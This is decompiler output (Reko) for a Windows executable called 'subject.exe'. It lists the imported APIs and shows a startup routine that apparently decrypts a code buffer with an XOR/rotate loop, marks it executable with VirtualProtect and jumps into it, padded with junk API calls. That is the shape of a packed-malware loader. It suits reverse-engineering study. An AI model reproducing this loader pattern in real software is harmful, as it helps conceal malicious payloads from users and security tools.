// subject_data_0000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t435000 = 'Z'; // 00435000
CHAR g_t435007 = 'Z'; // 00435007
CHAR g_t435014 = 'T'; // 00435014
CHAR g_t43502D = 'N'; // 0043502D
// subject_idata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> g_t42D026 = <code>; // 0042D026
// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__EnterCriticalSection = &g_t283DA; // 00428000
<anonymous> * __imp__SetEvent = &g_t283F2; // 00428004
<anonymous> * __imp__SetEndOfFile = &g_t283FE; // 00428008
<anonymous> * __imp__LocalFree = &g_t2840E; // 0042800C
<anonymous> * __imp__GetCPInfo = &g_t2841A; // 00428010
<anonymous> * __imp__GetTickCount = &g_t28426; // 00428014
<anonymous> * __imp__SetUnhandledExceptionFilter = &g_t28436; // 00428018
<anonymous> * __imp__RemoveDirectoryW = &g_t28454; // 0042801C
<anonymous> * __imp__DeleteFileA = &g_t28468; // 00428020
<anonymous> * __imp__OutputDebugStringA = &g_t28476; // 00428024
<anonymous> * __imp__GetShortPathNameA = &g_t2848C; // 00428028
<anonymous> * __imp__SetErrorMode = &g_t284A0; // 0042802C
<anonymous> * __imp__GetCommandLineA = &g_t284B0; // 00428030
<anonymous> * __imp__SearchPathW = &g_t284C2; // 00428034
<anonymous> * __imp__QueryPerformanceCounter = &g_t284D0; // 00428038
<anonymous> * __imp__TlsAlloc = &g_t284EA; // 0042803C
<anonymous> * __imp__GetSystemTime = &g_t284F6; // 00428040
<anonymous> * __imp__FreeLibrary = &g_t28506; // 00428044
<anonymous> * __imp__LeaveCriticalSection = &g_t28514; // 00428048
<anonymous> * __imp__FreeEnvironmentStringsW = &g_t2852C; // 0042804C
<anonymous> * __imp__LoadLibraryA = &g_t28546; // 00428050
<anonymous> * __imp__WriteFile = &g_t28556; // 00428054
<anonymous> * __imp__lstrcpynA = &g_t28562; // 00428058
<anonymous> * __imp__FlushFileBuffers = &g_t2856E; // 0042805C
<anonymous> * __imp__SetThreadLocale = &g_t28582; // 00428060
<anonymous> * __imp__GetLocaleInfoW = &g_t28594; // 00428064
<anonymous> * __imp__lstrcpyA = &g_t285A6; // 00428068
<anonymous> * __imp__TerminateProcess = &g_t285B2; // 0042806C
<anonymous> * __imp__MultiByteToWideChar = &g_t285C6; // 00428070
<anonymous> * __imp__UnhandledExceptionFilter = &g_t285DC; // 00428074
<anonymous> * __imp__CloseHandle = &g_t285F8; // 00428078
<anonymous> * __imp__CreateEventW = &g_t28606; // 0042807C
<anonymous> * __imp__OpenProcess = &g_t28616; // 00428080
<anonymous> * __imp__TlsFree = &g_t28624; // 00428084
<anonymous> * __imp__GetFileAttributesA = &g_t2862E; // 00428088
<anonymous> * __imp__GetSystemTimeAsFileTime = &g_t28644; // 0042808C
<anonymous> * __imp__LocalAlloc = &g_t2865E; // 00428090
<anonymous> * __imp__RemoveDirectoryA = &g_t2866C; // 00428094
<anonymous> * __imp__TlsGetValue = &g_t28680; // 00428098
<anonymous> * __imp__GetFileSize = &g_t2868E; // 0042809C
<anonymous> * __imp__GetVersionExA = &g_t2869C; // 004280A0
<anonymous> * __imp__VirtualFree = &g_t286AC; // 004280A4
<anonymous> * __imp__VirtualProtect = &g_t286BA; // 004280A8
<anonymous> * __imp__FindResourceW = &g_t286CC; // 004280AC
<anonymous> * __imp__WaitForSingleObject = &g_t286DC; // 004280B0
<anonymous> * __imp__ExitProcess = &g_t286F2; // 004280B4
<anonymous> * __imp__GetCommandLineW = &g_t28700; // 004280B8
<anonymous> * __imp__GetCurrentProcessId = &g_t28712; // 004280BC
<anonymous> * __imp__InitializeCriticalSection = &g_t28728; // 004280C0
<anonymous> * __imp__GetEnvironmentStringsW = &g_t28744; // 004280C4
<anonymous> * __imp__GetCurrentThreadId = &g_t2875E; // 004280C8
<anonymous> * __imp__LCMapStringA = &g_t28774; // 004280CC
<anonymous> * __imp__LCMapStringW = &g_t28784; // 004280D0
<anonymous> * __imp__CreateFileA = &g_t28794; // 004280D4
<anonymous> * __imp__MoveFileW = &g_t287A2; // 004280D8
<anonymous> * __imp__GetLastError = &g_t287AE; // 004280DC
<anonymous> * __imp__FreeEnvironmentStringsA = &g_t287BE; // 004280E0
<anonymous> * __imp__GetFileType = &g_t287D8; // 004280E4
<anonymous> * __imp__GlobalAlloc = &g_t287E6; // 004280E8
<anonymous> * __imp__GetEnvironmentVariableA = &g_t287F4; // 004280EC
<anonymous> * __imp__EnumSystemLocalesA = &g_t2880E; // 004280F0
<anonymous> * __imp__GetCurrentProcess = &g_t28824; // 004280F4
<anonymous> * __imp__SizeofResource = &g_t28838; // 004280F8
<anonymous> * __imp__GetOEMCP = &g_t2884A; // 004280FC
<anonymous> * __imp__CreateDirectoryA = &g_t28856; // 00428100
<anonymous> * __imp__InterlockedCompareExchange = &g_t2886A; // 00428104
<anonymous> * __imp__DeleteFileW = &g_t28888; // 00428108
<anonymous> * __imp__GetSystemDefaultLangID = &g_t28896; // 0042810C
<anonymous> * __imp__SetHandleCount = &g_t288B0; // 00428110
<anonymous> * __imp__GetProcAddress = &g_t288C2; // 00428114
<anonymous> * __imp__lstrlenA = &g_t288D4; // 00428118
<anonymous> * __imp__HeapSize = &g_t288E0; // 0042811C
<anonymous> * __imp__GetFullPathNameW = &g_t288EC; // 00428120
<anonymous> * __imp__CreateMutexA = &g_t28900; // 00428124
<anonymous> * __imp__LoadResource = &g_t28910; // 00428128
<anonymous> * __imp__DefWindowProcW = &g_t2892C; // 00428130
<anonymous> * __imp__CharUpperA = &g_t2893E; // 00428134
<anonymous> * __imp__LoadBitmapW = &g_t2894C; // 00428138
<anonymous> * __imp__RegisterWindowMessageW = &g_t2895A; // 0042813C
<anonymous> * __imp__DestroyIcon = &g_t28974; // 00428140
<anonymous> * __imp__GetSystemMetrics = &g_t28982; // 00428144
<anonymous> * __imp__SetWindowPos = &g_t28996; // 00428148
<anonymous> * __imp__UnregisterClassA = &g_t289A6; // 0042814C
<anonymous> * __imp__SendDlgItemMessageA = &g_t289BA; // 00428150
<anonymous> * __imp__RegisterClassA = &g_t289D0; // 00428154
<anonymous> * __imp__ShowWindow = &g_t289E2; // 00428158
<anonymous> * __imp__GetParent = &g_t289F0; // 0042815C
<anonymous> * __imp__LoadStringW = &g_t289FC; // 00428160
<anonymous> * __imp__GetCursorPos = &g_t28A0A; // 00428164
<anonymous> * __imp__FillRect = &g_t28A1A; // 00428168
<anonymous> * __imp__SetRect = &g_t28A26; // 0042816C
<anonymous> * __imp__MoveWindow = &g_t28A30; // 00428170
<anonymous> * __imp__GetDlgItem = &g_t28A3E; // 00428174
<anonymous> * __imp__GetClientRect = &g_t28A4C; // 00428178
<anonymous> * __imp__KillTimer = &g_t28A5C; // 0042817C
<anonymous> * __imp__wcschr = &g_t28A74; // 00428184
<anonymous> * __imp__memset = &g_t28A7E; // 00428188
<anonymous> * __imp__malloc = &g_t28A88; // 0042818C
<anonymous> * __imp__memcpy = &g_t28A92; // 00428190
<anonymous> * __imp__?what@exception@@UBEPBDXZ = &g_t28A9C; // 00428194
<anonymous> * __imp___amsg_exit = &g_t28AB8; // 00428198
<anonymous> * __imp____wgetmainargs = &g_t28AC6; // 0042819C
<anonymous> * __imp___wtoi = &g_t28AD8; // 004281A0
<anonymous> * __imp__CoTaskMemFree = &g_t28AEA; // 004281A8
<anonymous> * __imp__CLSIDFromProgID = &g_t28AFA; // 004281AC
word32 g_dw428218 = 164826; // 00428218
word32 g_dw42821C = 0x000283F2; // 0042821C
word32 g_dw428220 = 164862; // 00428220
word32 g_dw428224 = 0x0002840E; // 00428224
word32 g_dw428228 = 0x0002841A; // 00428228
word32 g_dw42822C = 0x00028426; // 0042822C
word32 g_dw428230 = 164918; // 00428230
word32 g_dw428234 = 0x00028454; // 00428234
word32 g_dw428238 = 0x00028468; // 00428238
word32 g_dw42823C = 0x00028476; // 0042823C
word32 g_dw428240 = 0x0002848C; // 00428240
word32 g_dw428244 = 0x000284A0; // 00428244
word32 g_dw428248 = 0x000284B0; // 00428248
word32 g_dw42824C = 0x000284C2; // 0042824C
word32 g_dw428250 = 0x000284D0; // 00428250
word32 g_dw428254 = 0x000284EA; // 00428254
word32 g_dw428258 = 165110; // 00428258
word32 g_dw42825C = 165126; // 0042825C
word32 g_dw428260 = 165140; // 00428260
word32 g_dw428264 = 165164; // 00428264
word32 g_dw428268 = 165190; // 00428268
word32 g_dw42826C = 0x00028556; // 0042826C
word32 g_dw428270 = 0x00028562; // 00428270
word32 g_dw428274 = 0x0002856E; // 00428274
word32 g_dw428278 = 0x00028582; // 00428278
word32 g_dw42827C = 165268; // 0042827C
word32 g_dw428280 = 165286; // 00428280
word32 g_dw428284 = 0x000285B2; // 00428284
word32 g_dw428288 = 165318; // 00428288
word32 g_dw42828C = 0x000285DC; // 0042828C
word32 g_dw428290 = 0x000285F8; // 00428290
word32 g_dw428294 = 0x00028606; // 00428294
word32 g_dw428298 = 0x00028616; // 00428298
word32 g_dw42829C = 0x00028624; // 0042829C
word32 g_dw4282A0 = 0x0002862E; // 004282A0
word32 g_dw4282A4 = 165444; // 004282A4
word32 g_dw4282A8 = 0x0002865E; // 004282A8
word32 g_dw4282AC = 0x0002866C; // 004282AC
word32 g_dw4282B0 = 0x00028680; // 004282B0
word32 g_dw4282B4 = 165518; // 004282B4
word32 g_dw4282B8 = 165532; // 004282B8
word32 g_dw4282BC = 165548; // 004282BC
word32 g_dw4282C0 = 165562; // 004282C0
word32 g_dw4282C4 = 0x000286CC; // 004282C4
word32 g_dw4282C8 = 165596; // 004282C8
word32 g_dw4282CC = 165618; // 004282CC
word32 g_dw4282D0 = 0x00028700; // 004282D0
word32 g_dw4282D4 = 165650; // 004282D4
word32 g_dw4282D8 = 0x00028728; // 004282D8
word32 g_dw4282DC = 0x00028744; // 004282DC
word32 g_dw4282E0 = 165726; // 004282E0
word32 g_dw4282E4 = 0x00028774; // 004282E4
word32 g_dw4282E8 = 0x00028784; // 004282E8
word32 g_dw4282EC = 0x00028794; // 004282EC
word32 g_dw4282F0 = 0x000287A2; // 004282F0
word32 g_dw4282F4 = 165806; // 004282F4
word32 g_dw4282F8 = 165822; // 004282F8
word32 g_dw4282FC = 0x000287D8; // 004282FC
word32 g_dw428300 = 165862; // 00428300
word32 g_dw428304 = 165876; // 00428304
word32 g_dw428308 = 0x0002880E; // 00428308
word32 g_dw42830C = 0x00028824; // 0042830C
word32 g_dw428310 = 0x00028838; // 00428310
word32 g_dw428314 = 0x0002884A; // 00428314
word32 g_dw428318 = 0x00028856; // 00428318
word32 g_dw42831C = 0x0002886A; // 0042831C
word32 g_dw428320 = 0x00028888; // 00428320
word32 g_dw428324 = 0x00028896; // 00428324
word32 g_dw428328 = 166064; // 00428328
word32 g_dw42832C = 0x000288C2; // 0042832C
word32 g_dw428330 = 166100; // 00428330
word32 g_dw428334 = 166112; // 00428334
word32 g_dw428338 = 166124; // 00428338
word32 g_dw42833C = 166144; // 0042833C
word32 g_dw428340 = 166160; // 00428340
word32 g_dw428348 = 166188; // 00428348
word32 g_dw42834C = 166206; // 0042834C
word32 g_dw428350 = 166220; // 00428350
word32 g_dw428354 = 166234; // 00428354
word32 g_dw428358 = 166260; // 00428358
word32 g_dw42835C = 0x00028982; // 0042835C
word32 g_dw428360 = 0x00028996; // 00428360
word32 g_dw428364 = 166310; // 00428364
word32 g_dw428368 = 166330; // 00428368
word32 g_dw42836C = 0x000289D0; // 0042836C
word32 g_dw428370 = 0x000289E2; // 00428370
word32 g_dw428374 = 0x000289F0; // 00428374
word32 g_dw428378 = 166396; // 00428378
word32 g_dw42837C = 0x00028A0A; // 0042837C
word32 g_dw428380 = 166426; // 00428380
word32 g_dw428384 = 0x00028A26; // 00428384
word32 g_dw428388 = 166448; // 00428388
word32 g_dw42838C = 166462; // 0042838C
word32 g_dw428390 = 166476; // 00428390
word32 g_dw428394 = 166492; // 00428394
word32 g_dw42839C = 166516; // 0042839C
word32 g_dw4283A0 = 166526; // 004283A0
word32 g_dw4283A4 = 0x00028A88; // 004283A4
word32 g_dw4283A8 = 166546; // 004283A8
word32 g_dw4283AC = 166556; // 004283AC
word32 g_dw4283B0 = 0x00028AB8; // 004283B0
word32 g_dw4283B4 = 166598; // 004283B4
word32 g_dw4283B8 = 166616; // 004283B8
word32 g_dw4283C0 = 166634; // 004283C0
word32 g_dw4283C4 = 166650; // 004283C4
// subject_text_0002.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00427BD1: void fn00427BD1(Stack Eq_2 dwArg04, Stack Eq_3 dwArg08, Stack Eq_3 dwArg0C)
// Called from:
//      Win32CrtStartup
void fn00427BD1(Eq_2 dwArg04, Eq_3 dwArg08, Eq_3 dwArg0C)
{
	Eq_2 ecx_18 = dwArg04;
	uint32 edi_20 = dwArg08 >> 0x02;
	do
	{
		ecx_18.u0->nLength -= dwArg0C;
		ecx_18.u0->nLength = ecx_18.u0->nLength ^ dwArg0C;
		ecx_18.u0->nLength = ecx_18.u0->nLength ^ 2131788971;
		ecx_18.u0->nLength = __ror<word32,byte>(ecx_18.u0->nLength, 0x93);
		ecx_18.u0->nLength -= dwArg0C;
		&ecx_18.u0->nLength = &ecx_18.u0->lpSecurityDescriptor;
		--edi_20;
	} while (edi_20 != 0x00);
}

// 00427C37: Register Eq_3 Win32CrtStartup()
Eq_3 Win32CrtStartup()
{
	ptr32 fp;
	Eq_3 tLoc08;
	Eq_3 dwLoc10;
	word32 * esp_16 = fp + ~0x27;
l00427C40:
	struct Eq_369 * esp_20 = esp_16 - 4;
	esp_20->dw0000 = 0x00;
	GetCommandLineA();
	esp_20->dwFFFFFFFC = 0x00;
	esp_20->dwFFFFFFF8 = 0x00;
	GetCommandLineW();
	esp_20->dwFFFFFFF4 = 4411427;
	esp_20->dwFFFFFFF0 = 0x00;
	esp_20->dwFFFFFFEC = 0x01A5;
	ptr32 esp_175 = esp_20 - 20;
	do
	{
		struct Eq_264 * esp_37 = esp_175 - 4;
		esp_37->t0000.u0 = 0x03;
		esp_37->tFFFFFFFC.u0 = 0x00;
		esp_37->tFFFFFFF8.u0 = 0x06;
		esp_37->tFFFFFFF4.u0 = 0xE0000000;
		esp_37->tFFFFFFF0 = (Eq_223) &g_t43502D;
		Eq_3 eax_47 = CreateFileA(esp_37->tFFFFFFF0, esp_37->tFFFFFFF4.u0, esp_37->tFFFFFFF8.u0, esp_37->tFFFFFFFC.u0, esp_37->t0000.u0, esp_37->t0004.u0, esp_37->t0008.u0);
		uint32 * esp_48 = &esp_37->t000C;
		if (eax_47 == ~0x00)
		{
			esp_37->t0008.u0 = (DWORD) eax_47;
			GetFileType(esp_37->t0008.u0);
			Eq_3 eax_58 = LoadLibraryA(esp_37->t000C);
			esp_37->t000C = (Eq_223) &g_t435007;
			esp_37->t0008.u0 = (DWORD) eax_58;
			esp_37->t000C = GetProcAddress(esp_37->t0008.u0, esp_37->t000C)();
			esp_37->t0008.u0 = 0x00;
			esp_37->t0004.u0 = 0x0125;
			esp_37->t0000.u0 = 0x03;
			esp_37->tFFFFFFFC.u0 = 0x00;
			esp_37->tFFFFFFF8.u0 = 0x04;
			esp_37->tFFFFFFF4.u0 = 0x60000000;
			esp_37->tFFFFFFF0 = (Eq_223) &g_t435000;
			Eq_3 eax_90 = CreateFileA(esp_37->tFFFFFFF0, esp_37->tFFFFFFF4.u0, esp_37->tFFFFFFF8.u0, esp_37->tFFFFFFFC.u0, esp_37->t0000.u0, esp_37->t0004.u0, esp_37->t0008.u0);
			esp_16 = (word32 *) &esp_37->t000C;
			dwLoc10 = eax_90;
			if (eax_90 != ~0x00)
				goto l00427C40;
			GetOEMCP();
			esp_37->t0008.u0 = 0x76DB;
			esp_48 = &esp_37->t0008.u0;
		}
		struct Eq_63 * esp_99 = esp_48 - 4;
		esp_99->t0000.u0 = 0x0042D000;
		esp_99->tFFFFFFFC.u0 = 0x00;
		esp_99->tFFFFFFF8.u0 = (DWORD) eax_47;
		GetFileSize(esp_99->tFFFFFFF8.u0, esp_99->tFFFFFFFC.u0);
		fn00427BD1(esp_99->t0000.u0, esp_99->t0004.u0, esp_99->t0008.u0);
		esp_99->t0008.u0 = (DWORD) eax_47;
		esp_99->t0004.u0 = 0x00;
		SizeofResource(esp_99->t0004.u0, esp_99->t0008.u0);
		esp_99->t0008.u0 = (DWORD) dwLoc10;
		GetFileType(esp_99->t0008.u0);
		esp_99->t0008.u0 = (DWORD) &tLoc08;
		esp_99->t0004.u0 = 0x40;
		GetOEMCP();
		esp_99->t0000.u0 = 0x76DB;
		esp_99->tFFFFFFFC.u0 = (DWORD) eax_47;
		CloseHandle(esp_99->tFFFFFFFC.u0);
		esp_99->tFFFFFFFC.u0 = (DWORD) dwLoc10;
		CloseHandle(esp_99->tFFFFFFFC.u0);
		esp_99->tFFFFFFFC.u0 = 0x0042D000;
		esp_99->tFFFFFFF8.u0 = (DWORD) eax_47;
		GetFileType(esp_99->tFFFFFFF8.u0);
		VirtualProtect(esp_99->tFFFFFFFC.u0, esp_99->t0000.u0, esp_99->t0004.u0, esp_99->t0008.u0);
		GetCommandLineA();
		esp_99->t000C.u0 = 0x00;
		esp_99->t0008.u0 = 0x0121;
		esp_99->t0004.u0 = 0x03;
		esp_99->t0000.u0 = 0x00;
		esp_99->tFFFFFFFC.u0 = 0x07;
		esp_99->tFFFFFFF8.u0 = 0x20000000;
		esp_99->tFFFFFFF4 = (Eq_223) &g_t435014;
		Eq_3 eax_174 = CreateFileA(esp_99->tFFFFFFF4, esp_99->tFFFFFFF8.u0, esp_99->tFFFFFFFC.u0, esp_99->t0000.u0, esp_99->t0004.u0, esp_99->t0008.u0, esp_99->t000C.u0);
		esp_175 = &esp_99->t0010.u0;
	} while (eax_174 != ~0x00);
	esp_99->t0010.u0 = (DWORD) eax_174;
	CloseHandle(esp_99->t0010.u0);
	Eq_3 eax_193;
	g_t42D026();
	return eax_193;
}

